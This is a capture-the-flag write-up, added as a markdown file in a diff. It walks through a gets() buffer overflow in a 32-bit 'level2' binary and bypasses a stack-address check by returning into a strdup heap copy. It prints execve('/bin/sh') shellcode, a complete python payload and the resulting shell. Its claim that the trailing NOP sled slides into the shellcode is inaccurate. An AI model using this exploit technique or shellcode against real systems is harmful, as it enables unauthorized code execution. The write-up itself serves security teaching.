@@ -1,0 +1,187 @@
+# Level2 - Buffer Overflow + Heap Shellcode Injection
+
+## Context
+
+The program uses `gets()` to read input — a function so dangerous it was removed from the C11 standard. However, a stack address check prevents us from jumping directly to the stack, forcing us to use the **heap** instead.
+
+---
+
+## What is a Buffer Overflow
+
+### How the stack works
+
+```
+[ buffer 76 bytes ]   ← gets() writes here
+[ saved ebp 4 b  ]
+[ return address ]    ← when ret executes, CPU jumps here
+```
+
+When `ret` executes, it reads the return address and jumps to it. If we overflow the buffer, we control where the CPU jumps.
+
+### Why gets() is dangerous
+
+```c
+gets(buffer);    // reads until '\n' with NO size limit
+                 // writes past the buffer end
+                 // overwrites return address
+```
+
+---
+
+## Attack Surface
+
+### The stack protection
+
+```asm
+mov 0x4(%ebp),%eax       ; read return address
+and $0xb0000000,%eax     ; mask high bits
+cmp $0xb0000000,%eax     ; does it start with 0xb ?
+jne → continue           ; no  → ok
+→ exit                   ; yes → kill program !
+```
+
+Stack addresses start with `0xbffff...` — the check detects them and exits.
+
+```
+stack   → 0xbffff...  → & 0xb0000000 = 0xb0000000 → BLOCKED !
+heap    → 0x0804a...  → & 0xb0000000 = 0x00000000 → ALLOWED !
+```
+
+### The solution : inject shellcode on the heap
+
+```asm
+call strdup    ; copies our buffer to the heap
+               ; returns heap address in eax (0x0804a008)
+ret            ; jumps to return address we control
+```
+
+`strdup` copies our input (including shellcode) to the heap at `0x0804a008` — an address that passes the check !
+
+---
+
+## Finding the offset
+
+### Using ltrace
+
+```bash
+ltrace ./level2
+gets(0xbffff70c ...)    ← buffer address on stack
+strdup("AAAA")  = 0x0804a008   ← heap address
+```
+
+### Buffer layout
+
+```asm
+lea -0x4c(%ebp),%eax    ; buffer = ebp-0x4c = 76 bytes
+```
+
+```
+buffer      = 76 bytes
+saved ebp   = 4 bytes
+return addr = 4 bytes
+total offset = 80 bytes
+```
+
+---
+
+## Building the shellcode
+
+No `system()` call exists in the binary, so we need to inject a shellcode that calls `execve("/bin/sh")` directly via syscall.
+
+### 32-bit Linux shellcode
+
+```asm
+xor  eax, eax         ; eax = 0
+cdq                   ; edx = 0
+push eax              ; push null terminator
+push 0x68732f2f       ; push "//sh"
+push 0x6e69622f       ; push "/bin"
+mov  ebx, esp         ; ebx = "/bin//sh"
+push eax              ; push null
+push ebx              ; push "/bin//sh"
+mov  ecx, esp         ; ecx = argv
+mov  al,  0xb         ; syscall 11 = execve
+int  0x80             ; trigger syscall
+```
+
+In bytes :
+```
+\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e
+\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80
+= 24 bytes
+```
+
+---
+
+## Payload Structure
+
+```
+[ shellcode 24b ][ NOP sled 56b ][ heap address 4b ]
+  execve /bin/sh   padding         0x0804a008
+  ←————————————— 80 bytes ————————————→
+```
+
+### Why the NOP sled
+
+```
+\x90 = NOP instruction = "do nothing, go to next"
+```
+
+Fills the remaining bytes between shellcode and return address. If execution lands anywhere in the NOP sled, it slides into the shellcode.
+
+```
+24 (shellcode) + 56 (NOP) = 80 bytes = exact offset to return address
+```
+
+### Why the heap address
+
+```
+strdup copies our buffer → heap → 0x0804a008
+ret jumps to 0x0804a008  → executes our shellcode !
+0x0804a008 & 0xb0000000  = 0x00000000 → passes the check !
+```
+
+---
+
+## Final Payload
+
+```bash
+python -c "print(
+  '\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'
+  + '\x90' * 56
+  + '\x08\xa0\x04\x08'   # 0x0804a008 in little endian
+)" > /tmp/exploit2
+
+cat /tmp/exploit2 - | ./level2
+```
+
+### Payload breakdown
+
+```
+\x31\xc0...\xcd\x80  →  shellcode execve("/bin/sh") = 24 bytes
+\x90 * 56            →  NOP sled to fill up to offset 80
+\x08\xa0\x04\x08     →  heap address 0x0804a008 in little endian
+```
+
+---
+
+## Full execution flow
+
+```
+1. gets()   → writes payload into stack buffer
+2. check    → return address 0x0804a008 → 0x00000000 → passes !
+3. strdup() → copies payload to heap at 0x0804a008
+4. ret      → jumps to 0x0804a008
+5. NOP sled → slides into shellcode
+6. shellcode → execve("/bin/sh") → shell !
+```
+
+---
+
+## Result
+
+```bash
+cat /tmp/exploit2 - | ./level2
+whoami
+level3    ← shell obtained !
+```
